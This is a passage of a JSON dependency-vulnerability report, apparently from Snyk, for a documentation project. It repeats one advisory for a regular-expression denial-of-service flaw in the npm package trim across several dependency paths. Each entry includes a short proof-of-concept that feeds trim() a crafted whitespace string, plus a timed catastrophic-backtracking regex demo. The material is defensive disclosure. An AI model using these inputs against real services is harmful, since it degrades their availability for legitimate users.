dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-pages@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-pages@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-blog@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-blog@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
